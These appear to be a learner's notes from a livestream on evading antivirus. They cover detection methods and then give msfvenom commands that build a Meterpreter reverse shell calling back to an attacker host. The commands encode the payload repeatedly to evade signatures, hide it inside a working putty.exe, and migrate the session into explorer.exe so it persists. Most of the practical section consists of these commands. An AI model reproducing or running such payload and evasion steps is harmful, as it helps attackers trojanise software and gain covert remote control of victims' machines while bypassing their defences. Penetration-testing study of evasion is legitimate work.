    !!!the above notes are taken during Alh4zr3d`s twitch stream on lazy AV Evasion




Typically an antivirus/EDR is using the above methods to detect a peace of malicious code or malicious executables

    -- Signature based detection 

        detecting mallware in which a unique identifier, normally a specific string of code,a sequence of bytes, or the hash of known malicious code, is established as associated with some piece of malware. 



        You can bypass signature based detection 

            - Custom payloads

            - obfuscating peace of malware

                    -encrypting /encoding
                    -Scrambling (mimikatz = MIMI + KAtZ)

    
    ---Heuristics/Behavioural based detection (Anomaly-Based Intrusion Detection)

        uses machine learning (ML) and statistical data to create a model of “normal” behavior. Anytime traffic deviates from this typical behavior, the system flags it as suspicious.



    -- Hybrid Intrusion Detection

        A hybrid system combines the best of both worlds. 


            You can bypass this with 

                -Polymorphism
                    is basically modyfiyng and randomizing the behaviour of the assymbly instructions


                -Custom payloads

                

        

    ---Starting with a basic meterpreter reverse shell obviously defender is going to flag it

    
    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f exe -o test1.exe


    In order to start analyzing each executable file we can work with rasta-mouse`s ThreatCheck which is a maintanance of materpreter`s originall one

    ( https://github.com/rasta-mouse/ThreatCheck )


    Takes a binary as input (either from a file on disk or a URL), splits it until it pinpoints that exact bytes that the target engine will flag on and prints them to the screen. 


    PS> C:\tools\threatcheck\threatcheck\threatcheck\bin\debug\threatcheck.exe -f test.exe

    ( we can see it in a live demonstration where ipssec does this manually and inspires the creation
    of this script
    https://www.youtube.com/watch?v=9pwMCHlNma4
     )



    ---On the second attempt we gonna encode the payload 

    we can list msfvenom`s encoders with:

    $msfvenom -l encoders |grep x64

    as we testing with x64 bins



    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f exe -o test2.exe -e x64/xor_dynamic -i 10

    -i stands for iterations as it recursively encodes the payload


    ---we can use the -x switch to backdoor the payload in a custom binary 

    as well as the -k switch will keep the functionality of the original binary and create a new thread for meterpreter shell

    you must use a custom binary and not a windows binary cause this proccess removes the signature and these bins are flagged easily

    preferably we should use a multythreaded binary

    Putty or another ssh client is a good canditate

    We can also add an exit function in order to preserve our putty.exe if the meterpreter dies

    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f exe -o test3.exe -e x64/xor_dynamic -i 10 -x putty.exe -k  

    
    Suppose user in the victim machine runs the putty backdoored binary and after we finish our tasks we exit meterpreter or the session just dies on us.The defaulr behaviour in this situation is for meterpreter to kill the proccess which is run by default option.So we can change that from multi/handler in msfconsole
    
    set exitfunc = thread (msfconsole)


    ---ALSO we can u use autoloadstdapi and change it to false to bypass heuristics.Meterpreter though will be very limited without it`s standard API.

    Suppose now that the user after finishes using putty decides to terminate the proccess.This way the meterpreter session will also die.We can choose from the console for meterpreter to migrate in a new proccess after spawning the backdoored executable and also choose the specific one we want to.


    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o test3.exe -e x64/xor_dynamic -i 10 -x putty.exe -k  


    
    
